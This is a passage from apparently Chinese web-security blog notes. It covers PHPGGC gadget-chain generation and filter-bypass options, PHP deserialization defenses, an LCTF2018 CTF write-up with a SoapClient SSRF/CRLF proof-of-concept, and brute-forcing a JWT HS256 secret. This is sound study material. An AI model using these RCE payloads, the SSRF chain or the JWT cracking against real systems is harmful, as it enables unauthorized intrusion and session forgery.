class="hljs-regexp">/tmp/</span>dataO:<span class="hljs-number">13</span>:<span class="hljs-string">&quot;Swift_Message&quot;</span>:<span class="hljs-number">8</span>:&#123;...&#125;</code></pre></div><h4 id="Wrapper"><a href="#Wrapper" class="headerlink" title="Wrapper"></a>Wrapper</h4><p>The <code>--wrapper</code> (<code>-w</code>) option allows you to define a PHP file containing the following functions:</p><ul><li><code>process_parameters($parameters)</code>: Called right <strong>before</strong> <code>generate()</code>, allows to change parameters</li><li><code>process_object($object)</code>: Called right <strong>before</strong> <code>serialize()</code>, allows to change the object</li><li><code>process_serialized($serialized)</code>: Called right <strong>after</strong> <code>serialize()</code>, allows to change the serialized string</li></ul><p>For instance, if the vulnerable code looks like this:</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$data</span> = unserialize(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>]);<span class="hljs-keyword">print</span> <span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;message&#x27;</span>];</code></pre></div><p>You could use a <code>__toString()</code> chain, wrapping it like so:</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment"># /tmp/my_wrapper.php</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">process_object</span>(<span class="hljs-params"><span class="hljs-variable">$object</span></span>)</span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">return</span> <span class="hljs-keyword">array</span>(        <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-variable">$object</span>    );&#125;</code></pre></div><p>And you’d call phpggc like so:</p><div class="hljs code-wrapper"><pre><code class="hljs php">$ ./phpggc -w /tmp/my_wrapper.php slim/rce1 system ida:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;message&quot;</span>;O:<span class="hljs-number">18</span>:<span class="hljs-string">&quot;Slim\Http\Response&quot;</span>:<span class="hljs-number">2</span>:&#123;...&#125;&#125;</code></pre></div><h4 id="PHAR-GGC"><a href="#PHAR-GGC" class="headerlink" title="PHAR(GGC)"></a>PHAR(GGC)</h4><h5 id="History"><a href="#History" class="headerlink" title="History"></a>History</h5><p>At BlackHat US 2018, @s_n_t released PHARGGC, a fork of PHPGGC which instead of building a serialized payload, builds a whole PHAR file. This PHAR file contains serialized data and as such can be used for various exploitation techniques (<code>file_exists</code>, <code>fopen</code>, etc.). The paper is <a href="https://cdn2.hubspot.net/hubfs/3853213/us-18-Thomas-It's-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-....pdf">here</a>.</p><h5 id="Implementation"><a href="#Implementation" class="headerlink" title="Implementation"></a>Implementation</h5><p>PHAR archives come in three different formats: <strong>PHAR, TAR, and ZIP</strong>. The three of them are supported by PHPGGC. Polyglot files can be generated using <code>--phar-jpeg</code> (<code>-pj</code>). Other options are available (use <code>-h</code>).</p><h5 id="Examles"><a href="#Examles" class="headerlink" title="Examles"></a>Examles</h5><div class="hljs code-wrapper"><pre><code class="hljs bash">$ <span class="hljs-comment"># Creates a PHAR file in the PHAR format and stores it in /tmp/z.phar</span>$ ./phpggc -p phar -o /tmp/z.phar monolog/rce1 system id$ <span class="hljs-comment"># Creates a PHAR file in the ZIP format and stores it in /tmp/z.zip.phar</span>$ ./phpggc -p zip -o /tmp/z.zip.phar monolog/rce1 system id$ <span class="hljs-comment"># Creates a polyglot JPEG/PHAR file from image /tmp/dummy.jpg and stores it in /tmp/z.zip.phar</span>$ ./phpggc -pj /tmp/dummy.jpg -o /tmp/z.zip.phar monolog/rce1 system id</code></pre></div><h4 id="Encoders"><a href="#Encoders" class="headerlink" title="Encoders"></a>Encoders</h4><p>Arguments allow to modify the way the payload is output. For instance, <code>-u</code> will URL encode it, and <code>-b</code> will convert it to base64. <strong>Payloads often contain NULL bytes and cannot be copy/pasted as-is</strong>. Use <code>-s</code> for a soft URL encode, which keeps the payload readable.</p><p>The encoders can be chained, and as such <strong>the order is important</strong>. For instance, <code>./phpggc -b -u -u slim/rce1 system id</code> will <strong>base64</strong> the payload, then <strong>URLencode it twice.</strong></p><h4 id="Advanced-Enhancements"><a href="#Advanced-Enhancements" class="headerlink" title="Advanced: Enhancements"></a>Advanced: Enhancements</h4><h5 id="Fast-destruct"><a href="#Fast-destruct" class="headerlink" title="Fast destruct"></a>Fast destruct</h5><p>PHPGGC implements a <code>--fast-destruct</code> (<code>-f</code>) flag, that will make sure your serialized object will be destroyed right after the <code>unserialize()</code> call, and not at the end of the script. <strong>I’d recommend using it for every <code>__destruct</code> vector</strong>, as it improves reliability. For instance, if PHP script raises an exception after the call, the <code>__destruct</code> method of your object might not be called. As it is processed at the same time as encoders, it needs to be set first.</p><div class="hljs code-wrapper"><pre><code class="hljs awk">$ .<span class="hljs-regexp">/phpggc -f -s slim/</span>rce1 system ida:<span class="hljs-number">2</span>:&#123;i:<span class="hljs-number">7</span>;O:<span class="hljs-number">18</span>:<span class="hljs-string">&quot;Slim\Http\Response&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;...</span></code></pre></div><h4 id="ASCII-Strings"><a href="#ASCII-Strings" class="headerlink" title="ASCII Strings"></a>ASCII Strings</h4><p>Uses the <code>S</code> serialization format instead of the standard <code>s</code>. This replaces every non-ASCII value to an hexadecimal representation: <strong><code>s:5:&quot;A&lt;null_byte&gt;B&lt;cr&gt;&lt;lf&gt;&quot;;̀</code> -&gt; <code>S:5:&quot;A\00B\09\0D&quot;;</code></strong> This can be useful when for some reason non-ascii characters are not allowed (NULL BYTE for instance). Since payloads generally contain them, this makes sure that the payload consists only of ASCII values. <em>Note: this is experimental and it might not work in some cases.</em></p><h4 id="Plus-Numbers"><a href="#Plus-Numbers" class="headerlink" title="Plus Numbers"></a>Plus Numbers</h4><p>Sometimes, PHP scripts verify that the given serialized payload does not contain objects by using a regex such as <code>/O:[0-9]+:</code>. This is easily bypassed using <code>O:+123:...</code> instead of <code>O:123:</code>. One can use <code>--plus-numbers &lt;types&gt;</code>, or <code>-n &lt;types&gt;</code>, to automatically add these <code>+</code> signs in front of symbols. For instance, to obfuscate objects and strings, one can use: <code>--n Os</code>. Please note that since PHP 7.2, only i and d (float) types can have a +.</p><h3 id="phpggc流程分析"><a href="#phpggc流程分析" class="headerlink" title="phpggc流程分析"></a>phpggc流程分析</h3><h3 id="phpggc拓展"><a href="#phpggc拓展" class="headerlink" title="phpggc拓展"></a>phpggc拓展</h3><h2 id="0x10-php反序列化防御方法"><a href="#0x10-php反序列化防御方法" class="headerlink" title="0x10 php反序列化防御方法"></a>0x10 php反序列化防御方法</h2><h3 id="防御策略"><a href="#防御策略" class="headerlink" title="防御策略"></a>防御策略</h3><h4 id="动态调用与危险函数"><a href="#动态调用与危险函数" class="headerlink" title="动态调用与危险函数"></a>动态调用与危险函数</h4><ol><li>在写到动态调用和危险函数时，务必对变量和方法进行回溯。查看变量是否是可控的。</li><li>在容许的情况下，使用静态属性进行动态调用可以防止可控变量调用危险函数。</li><li>在调用<code>$this-&gt;aaa-&gt;bbb()</code>这样类似的结构前可以利用<code>instanceof</code>进行检查，查看其是否是期望调用的类。</li></ol><h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><ol><li>注意尽量少的在魔法方法中写入可以调用大量其它方法的方法。尤其是<code>__destruct</code>和<code>__wakeup</code>。</li><li>注意在公共且不需要参数的方法中不要直接调用危险函数和动态调用。</li><li>在不需要<code>__wakeup</code>方法且类没必要序列化时，可以考虑<strong>使用<code>__wakeup</code>阻止反序列化。</strong></li></ol><h3 id="最最最最最重要的"><a href="#最最最最最重要的" class="headerlink" title="最最最最最重要的"></a>最最最最最重要的</h3><p>不要让unserialize和文件类函数用户可控！！！<br>不要让unserialize和文件类函数用户可控！！！<br>不要让unserialize和文件类函数用户可控！！！</p><h2 id="0x11-php-反序列化刷题-转载"><a href="#0x11-php-反序列化刷题-转载" class="headerlink" title="0x11 php 反序列化刷题(转载)"></a>0x11 <a href="https://ca0y1h.top/Web_security/ctf_writeup/6.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">php 反序列化刷题</a>(转载)</h2><h3 id="LCTF2018-Bestphp’s-revenge"><a href="#LCTF2018-Bestphp’s-revenge" class="headerlink" title="LCTF2018 Bestphp’s revenge"></a>LCTF2018 Bestphp’s revenge</h3><blockquote><p>这篇文章分析的很到位：<a href="https://www.anquanke.com/post/id/164569#h2-5">https://www.anquanke.com/post/id/164569#h2-5</a></p></blockquote><h4 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h4><ul><li>session反序列化</li><li>Soapclient + ssrf</li><li>CRLF</li></ul><h4 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h4><p>index.php</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>highlight_file(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-variable">$b</span> = <span class="hljs-string">&#x27;implode&#x27;</span>;call_user_func(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f&#x27;</span>], <span class="hljs-variable">$_POST</span>);session_start();<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>])) &#123;    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>];&#125;var_dump(<span class="hljs-variable">$_SESSION</span>);<span class="hljs-variable">$a</span> = <span class="hljs-keyword">array</span>(reset(<span class="hljs-variable">$_SESSION</span>), <span class="hljs-string">&#x27;welcome_to_the_lctf2018&#x27;</span>);call_user_func(<span class="hljs-variable">$b</span>, <span class="hljs-variable">$a</span>);<span class="hljs-meta">?&gt;</span></code></pre></div><p>flag.php</p><div class="hljs code-wrapper"><pre><code class="hljs php">only localhost can get flag!session_start(); <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;only localhost can get flag!&#x27;</span>; <span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;LCTF&#123;*************************&#125;&#x27;</span>; <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]===<span class="hljs-string">&quot;127.0.0.1&quot;</span>)&#123; <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] = <span class="hljs-variable">$flag</span>; &#125; only localhost can get flag!</code></pre></div><p>思路如下：</p><ol><li>利用第4行回调函数来调用<code>session_start()</code>用于覆盖session序列化引擎为php_serilaze；</li><li>构造SSRF的Soap类的序列化字符串配合上面的序列化注入写入session文件，并且构造的序列化字符串中利用了CRLF漏洞写入了我们规定的seesion_id；</li><li>然后再通过第4行的回调函数调用<code>extract()</code>函数用于变量覆盖，覆盖掉变量b为回调函数<code>call_user_func</code>；</li><li>同时我们可以传入<code>name=SoapClient</code>，那么最后<code>call_user_func($b, $a)</code>就变成<code>call_user_func(array(&#39;SoapClient&#39;,&#39;welcome_to_the_lctf2018&#39;))</code>,即<code>call_user_func(SoapClient-&gt;welcome_to_the_lctf2018)</code>，由于<code>SoapClient</code>类中没有<code>welcome_to_the_lctf2018</code>这个方法，就会调用魔术方法<code>__call()</code>从而发送请求。</li><li>发送请求也就是去访问flag.php，并将结果保存在cookie为第二步我们规定的session_id的文件中。</li><li>再用这个session访问主页，就会<code>var_dump</code>session文件的内容，其中就包含字段名为<code>flag</code>的值。</li></ol><p>先构造POC：</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$target</span> = <span class="hljs-string">&quot;http://127.0.0.1/flag.php&quot;</span>;<span class="hljs-variable">$attack</span> = <span class="hljs-keyword">new</span> SoapClient(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;location&#x27;</span> =&gt; <span class="hljs-variable">$target</span>,    <span class="hljs-string">&#x27;user_agent&#x27;</span> =&gt; <span class="hljs-string">&quot;N0rth3ty\r\nCookie: PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4\r\n&quot;</span>,    <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; <span class="hljs-string">&quot;123&quot;</span>));<span class="hljs-variable">$payload</span> = urlencode(serialize(<span class="hljs-variable">$attack</span>));<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;|&#x27;</span>.<span class="hljs-variable">$payload</span>;</code></pre></div><p>这个poc就是利用crlf伪造请求去访问flag.php并将结果保存在cookie为<code>PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4</code>的session中。</p><p>再注入反序列化的字符串：</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20200623152347.png" alt="img"></p><p>接着触发<code>SoapClient</code>的<code>__call</code>方法发送请求：</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20200623152825.png" alt="img"></p><p>更改cookie访问：</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20200623152931.png" alt="img"></p><h4 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h4><p>这道题卡了我一天的时间，还是一个签到题。。。。有一个问题一直困扰我，就是把POC生成的字符串写到session文件后，他是什么时候把session的文件内容给反序列化出来了。后来看了一篇文章才知道：</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20200623153337.png" alt="img"></p><p>于是就反序列化了一个<code>SoapClient</code>的实例，再调用<code>__call</code>函数的时候就会通过这个实例发送请求。</p><h1 id="转载与参考链接"><a href="#转载与参考链接" class="headerlink" title="转载与参考链接"></a>转载与参考链接</h1><ul><li><a href="https://www.neatstudio.com/show-161-1.shtml">PHP 序列化（serialize）格式详解</a></li><li><a href="https://xz.aliyun.com/t/3674">PHP反序列化由浅入深</a></li><li><a href="https://www.cnblogs.com/Wanghaoran-s1mple/p/13160708.html">借安恒月赛web pop对象注入+反序列化字符逃逸深究其逃逸原理</a></li><li><a href="http://redteam.today/2017/10/01/POP%E9%93%BE%E5%AD%A6%E4%B9%A0/">POP链学习</a></li><li><a href="https://xz.aliyun.com/t/3336#toc-2">从LCTF WEB签到题看PHP反序列化</a></li><li><a href="https://www.smi1e.top/lctf2018-bestphps-revenge-%E8%AF%A6%E7%BB%86%E9%A2%98%E8%A7%A3/">LCTF2018-bestphp’s revenge 详细题解</a></li><li><a href="https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html">反序列化之PHP原生类的利用</a></li><li><a href="https://xz.aliyun.com/t/3341#toc-13">LCTF 2018 Writeup – Nu1L</a></li><li><a href="https://xi4or0uji.github.io/2019/06/27/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%94%B1%E6%B5%85%E5%88%B0%E6%B7%B1/#%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%BA%8F%E5%88%97%E5%8C%96%E9%97%AE%E9%A2%98">php反序列化由浅到深</a></li><li><a href="https://0day.design/2019/03/05/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/">php反序列化原生类利用</a></li><li><a href="https://www.cnblogs.com/tr1ple/p/10188308.html">PHP SECURITY CALENDAR 2017 学习总结-更新中</a></li><li><a href="https://medium.com/@Wh0ale/php-audit-labs-day3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-27834dcc3558">PHP-Audit-Labs — Day3 反序列化</a></li><li><a href="https://segmentfault.com/a/1190000009742195">(转)详解spl_autoload_register()函数</a></li><li><a href="https://ca0y1h.top/Web_security/php_related/5.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/">从两道CTF题目学习PHP原生类反序列化利用</a></li><li><a href="https://xz.aliyun.com/t/5450">从0到1掌握反序列化工具之PHPGGC</a></li><li><a href="http://127.0.0.1/html/index.html">Web安全学习笔记</a></li><li><a href="https://xz.aliyun.com/t/7570#toc-5">从CTF中学习PHP反序列化的各种利用方式</a></li><li><a href="https://xz.aliyun.com/t/8082#toc-13">怎样挖掘出属于自己的php反序列化链</a></li><li><a href="http://vlambda.com/wz_1cLwVzfPSC.html">实战工具：PHPGGC详解</a></li><li><a href="https://paper.seebug.org/1267/">从反序列化到类型混淆漏洞——记一次 ecshop 实例利用</a></li><li><a href="https://www.cnblogs.com/20175211lyz/p/13633840.html">DDCTF 2020</a></li><li><a href="https://www.freebuf.com/vuls/202819.html">利用session.upload_progress进行文件包含和反序列化渗透</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>web安全</category>
      
      <category>ctf</category>
      
      <category>php反序列化漏洞</category>
      
      <category>强网杯</category>
      
      <category>web辅助</category>
      
      <category>0ctf2016</category>
      
      <category>piapiapia</category>
      
      <category>安恒月赛</category>
      
      <category>basic</category>
      
      <category>CISCN2020</category>
      
      <category>babyunserialize</category>
      
      <category>BJDCTF 2rd</category>
      
      <category>XSS之光</category>
      
      <category>SUCTF 2019</category>
      
      <category>uploads 2</category>
      
      <category>ddctf 2020</category>
      
      <category>Overwrite Me</category>
      
      <category>LCTF2018</category>
      
      <category>Bestphp’s revenge</category>
      
      <category>Jarvisoj Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>php</tag>
      
      <tag>web安全</tag>
      
      <tag>ctf</tag>
      
      <tag>php反序列化漏洞</tag>
      
      <tag>phpggc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>jwt 安全</title>
    <link href="/2020/09/20/jwt-%E5%AE%89%E5%85%A8/"/>
    <url>/2020/09/20/jwt-%E5%AE%89%E5%85%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="JWT安全"><a href="#JWT安全" class="headerlink" title="JWT安全"></a>JWT安全</h1><h2 id="一、JWT定义及其组成"><a href="#一、JWT定义及其组成" class="headerlink" title="一、JWT定义及其组成"></a>一、JWT定义及其组成</h2><p> JWT（JSON Web Token）是一个非常轻巧的规范。这个规范允许我们使用JWT在用户和服务器之间传递安全可靠的信息。</p><p>一个JWT实际上就是一个字符串，它由三部分组成，头部、载荷与签名。 </p><h3 id="载荷（Payload）"><a href="#载荷（Payload）" class="headerlink" title="载荷（Payload）"></a>载荷（Payload）</h3><p> 我们先将用户认证的操作描述成一个JSON对象。其中添加了一些其他的信息，帮助今后收到这个JWT的服务器理解这个JWT。 </p><div class="hljs code-wrapper"><pre><code class="hljs json">&#123;    <span class="hljs-attr">&quot;sub&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>,    <span class="hljs-attr">&quot;iss&quot;</span>: <span class="hljs-string">&quot;http://localhost:8000/auth/login&quot;</span>,    <span class="hljs-attr">&quot;iat&quot;</span>: <span class="hljs-number">1451888119</span>,    <span class="hljs-attr">&quot;exp&quot;</span>: <span class="hljs-number">1454516119</span>,    <span class="hljs-attr">&quot;nbf&quot;</span>: <span class="hljs-number">1451888119</span>,    <span class="hljs-attr">&quot;jti&quot;</span>: <span class="hljs-string">&quot;37c107e4609ddbcc9c096ea5ee76c667&quot;</span>&#125;</code></pre></div><p> 这里面的前6个字段都是由JWT的标准所定义的。 </p><ul><li><p>sub: 该JWT所面向的用户</p></li><li><p>iss: 该JWT的签发者</p></li><li><p>iat(issued at): 在什么时候签发的token</p></li><li><p>exp(expires): token什么时候过期</p></li><li><p>nbf(not before)：token在此时间之前不能被接收处理</p></li><li><p>jti：JWT ID为web token提供唯一标识</p><p>这些定义都可以在<a href="https://tools.ietf.org/html/draft-ietf-oauth-json-web-token-32">标准</a>中找到。</p></li></ul><p>将上面的JSON对象进行base64编码可以得到下面的字符串： </p><div class="hljs code-wrapper"><pre><code class="hljs base64">eyJzdWIiOiIxIiwiaXNzIjoiaHR0cDpcL1wvbG9jYWxob3N0OjgwMDFcL2F1dGhcL2xvZ2luIiwiaWF0IjoxNDUxODg4MTE5LCJleHAiOjE0NTQ1MTYxMTksIm5iZiI6MTQ1MTg4ODExOSwianRpIjoiMzdjMTA3ZTQ2MDlkZGJjYzljMDk2ZWE1ZWU3NmM2NjcifQ</code></pre></div><p> 这个字符串我们将它称作JWT的Payload（载荷）。</p><p>如果你使用Node.js，可以用Node.js的包base64url来得到这个字符串： </p><div class="hljs code-wrapper"><pre><code class="hljs Node.js">var base64url &#x3D; require(&#39;base64url&#39;)var header &#x3D; &#123;    &quot;from_user&quot;: &quot;B&quot;,    &quot;target_user&quot;: &quot;A&quot;&#125;console.log(base64url(JSON.stringify(header)))</code></pre></div><blockquote><p>注：Base64是一种编码，也就是说，它是可以被翻译回原来的样子来的。它并不是一种加密过程。</p></blockquote><h4 id="头部（Header）"><a href="#头部（Header）" class="headerlink" title="头部（Header）"></a><strong>头部（Header）</strong></h4><p> JWT还需要一个头部，头部用于描述关于该JWT的最基本的信息，例如其类型以及签名所用的算法等。这也可以被表示成一个JSON对象： </p><div class="hljs code-wrapper"><pre><code class="hljs json">&#123;  <span class="hljs-attr">&quot;typ&quot;</span>: <span class="hljs-string">&quot;JWT&quot;</span>,  <span class="hljs-attr">&quot;alg&quot;</span>: <span class="hljs-string">&quot;HS256&quot;</span>&#125;</code></pre></div><p> 在这里，我们说明了这是一个JWT，并且我们所用的签名算法（后面会提到）是HS256算法。</p><p>对它也要进行Base64编码，之后的字符串就成了JWT的Header（头部）： </p><div class="hljs code-wrapper"><pre><code class="hljs gcode">eyJ<span class="hljs-number">0</span>eXAiOiJKV<span class="hljs-number">1</span>QiLCJhbGciOiJIUzI<span class="hljs-number">1</span><span class="hljs-symbol">NiJ9</span></code></pre></div><h4 id="签名（签名）"><a href="#签名（签名）" class="headerlink" title="签名（签名）"></a><strong>签名（签名）</strong></h4><p> 将上面的两个编码后的字符串都用句号.连接在一起（头部在前），就形成了： </p><div class="hljs code-wrapper"><pre><code class="hljs gcode">eyJ<span class="hljs-number">0</span>eXAiOiJKV<span class="hljs-number">1</span>QiLCJhbGciOiJIUzI<span class="hljs-number">1</span><span class="hljs-symbol">NiJ9</span>.eyJzdWIiOiIxIiwiaX<span class="hljs-symbol">NzIjoiaHR0</span>cDpcL<span class="hljs-number">1</span>wvb<span class="hljs-name">G9</span>jYWxob<span class="hljs-number">3</span><span class="hljs-symbol">N0</span>OjgwMDFcL<span class="hljs-number">2</span>F<span class="hljs-number">1</span>dGhcL<span class="hljs-number">2</span>xvZ<span class="hljs-number">2</span>luIiwiaWF<span class="hljs-number">0</span>Ijox<span class="hljs-symbol">NDUxODg4</span>MTE<span class="hljs-number">5</span>LCJleHAiOjE<span class="hljs-number">0</span><span class="hljs-symbol">NTQ1</span>MTYxMTksI<span class="hljs-name">m5</span>iZiI<span class="hljs-number">6</span>MTQ<span class="hljs-number">1</span>MT<span class="hljs-name">g4</span>ODExOSwia<span class="hljs-symbol">nRpIjoiMzdjMTA3</span>ZTQ<span class="hljs-number">2</span>MDlkZGJjYzljMDk<span class="hljs-number">2</span>ZWE<span class="hljs-number">1</span>ZWU<span class="hljs-number">3</span><span class="hljs-symbol">NmM2</span><span class="hljs-symbol">NjcifQ</span></code></pre></div><p> 最后，我们将上面拼接完的字符串用HS256算法进行加密。在加密的时候，我们还需要提供一个密钥（secret）: </p><div class="hljs code-wrapper"><pre><code class="hljs lisp">HMACSHA256(    base64UrlEncode(<span class="hljs-name">header</span>) + <span class="hljs-string">&quot;.&quot;</span> +    base64UrlEncode(<span class="hljs-name">payload</span>),    secret)</code></pre></div><p> 这样就可以得到我们加密后的内容： </p><div class="hljs code-wrapper"><pre><code class="hljs gcode">wyoQ<span class="hljs-number">95</span>RjAyQ<span class="hljs-number">2</span>FF<span class="hljs-number">3</span>aj<span class="hljs-number">8</span>E<span class="hljs-attr">vCSaUmeP0</span>KUqcCJDE<span class="hljs-symbol">NNfnaT4</span></code></pre></div><p> 这一部分又叫做签名。</p><p>最后将这一部分签名也拼接在被签名的字符串后面，我们就得到了完整的JWT： </p><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9</span>.eyJzdWIiOiIxIiwiaXNzIjoiaHR<span class="hljs-number">0</span>cDpcL<span class="hljs-number">1</span>wvbG<span class="hljs-number">9</span>jYWx<span class="hljs-attribute">ob3N0OjgwMDFcL2F1dGhcL2xvZ2luIiwiaWF0IjoxNDUxODg4MTE5LCJleHAiOjE0NTQ1MTYxMTksIm5iZiI6MTQ1MTg4OD</span><span class="hljs-attribute">ExOSwianRpIjoiMzdjMTA3ZTQ2MDlkZGJjYzljMDk2ZWE1ZWU3NmM2NjcifQ</span>.wyoQ<span class="hljs-number">95</span>RjAyQ<span class="hljs-number">2</span>FF<span class="hljs-number">3</span>aj<span class="hljs-number">8</span>EvCSaUmeP<span class="hljs-number">0</span>KUqcCJDENNfnaT</code></pre></div><h2 id="二、JWT破解与伪造"><a href="#二、JWT破解与伪造" class="headerlink" title="二、JWT破解与伪造"></a>二、JWT破解与伪造</h2><p>JSON Web Token（JWT）是一个非常轻巧的规范。这个规范允许我们使用JWT在用户和服务器之间传递安全可靠的信息。JWT常被用于前后端分离，可以和Restful API配合使用，常用于构建身份认证机制。</p><p>JWT的数据格式分为三个部分： headers , payloads，signature(签名)，它们使用<code>.</code>点号分割。</p><h3 id="JWT示例："><a href="#JWT示例：" class="headerlink" title="JWT示例："></a>JWT示例：</h3><p><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6ImZhbHNlIn0.oe4qhTxvJB8nNAsFWJc7_m3UylVZzO3FwhkYuESAyUM</code></p><h3 id="进行base64解密："><a href="#进行base64解密：" class="headerlink" title="进行base64解密："></a>进行base64解密：</h3><p><code>&#123;&quot;alg&quot;:&quot;HS256&quot;,&quot;typ&quot;:&quot;JWT&quot;&#125;.&#123;&quot;admin&quot;:&quot;falseIn0.¡î*&lt;o$&#39;4X;_u2Vs;qpF. 2UM</code></p><p>伪造的目的就是将admin修改成ture，但是不是简单的修改然后base64加密，JWT会对其合法性进行token验证。</p><h3 id="验证方法："><a href="#验证方法：" class="headerlink" title="验证方法："></a>验证方法：</h3><p>首先服务端会产生一个<code>key</code>，然后以这个<code>key</code>作为密钥，使用第一部分选择的加密方式（这里就是<code>HS256</code>），对第一部分和第二部分<code>拼接的结果</code>进行加密，然后把加密结果放到<code>第三部分</code>。</p><p>第一部分：{“alg”:”HS256”,”typ”:”JWT”}</p><p>第二部分：{“admin”:”false}</p><h3 id="提供一个破解key的工具"><a href="#提供一个破解key的工具" class="headerlink" title="提供一个破解key的工具"></a>提供一个破解key的工具</h3><p>​    <a href="https://github.com/brendan-rius/c-jwt-cracker">C语言版JWT破解工具</a></p><p>​    下载后拖到kali中使用命令make编译</p><div class="hljs code-wrapper"><pre><code class="hljs gcode">./jwtcrack eyJhbGciOiJIUzI<span class="hljs-number">1</span><span class="hljs-symbol">NiIsInR5</span>cCI<span class="hljs-number">6</span>IkpX<span class="hljs-attr">VCJ9</span>.eyJhZ<span class="hljs-name">G1</span>pbiI<span class="hljs-number">6</span>ImZhbH<span class="hljs-symbol">NlIn0</span>.oe<span class="hljs-number">4</span>qhTxvJB<span class="hljs-number">8</span><span class="hljs-symbol">nNAsFWJc7</span>_<span class="hljs-name">m3</span>UylVZz<span class="hljs-meta">O3</span>FwhkYuESAyUM</code></pre></div><p>基本上就是爆破了，下面是运行结果：</p><div class="hljs code-wrapper"><pre><code class="hljs bash">root@kali:~/桌面/c-jwt-cracker-master<span class="hljs-comment"># ./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6ImZhbHNlIn0.oe4qhTxvJB8nNAsFWJc7_m3UylVZzO3FwhkYuESAyUM</span>Secret is <span class="hljs-string">&quot;54l7y&quot;</span></code></pre></div><h3 id="验证网站"><a href="#验证网站" class="headerlink" title="验证网站"></a>验证网站</h3><p>​    <a href="https://jwt.io/#debugger-io">https://jwt.io/#debugger-io</a></p><p>验证一下是否正确</p><h2 id="其他资料"><a href="#其他资料" class="headerlink" title="其他资料"></a>其他资料</h2><ul><li><a href="https://www.shuzhiduo.com/A/Ae5RR3WN5Q/">https://www.shuzhiduo.com/A/Ae5RR3WN5Q/</a></li><li></li></ul>]]></content>
    
    
    <categories>
      
      <category>web安全</category>
      
      <category>jwt</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web安全</tag>
      
      <tag>jwt</tag>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqlmap 解决sqli-labs</title>
    <link href="/2020/09/10/sqlmap-%E8%A7%A3%E5%86%B3sqli-labs/"/>
    <url>/2020/09/10/sqlmap-%E8%A7%A3%E5%86%B3sqli-labs/</url>
    
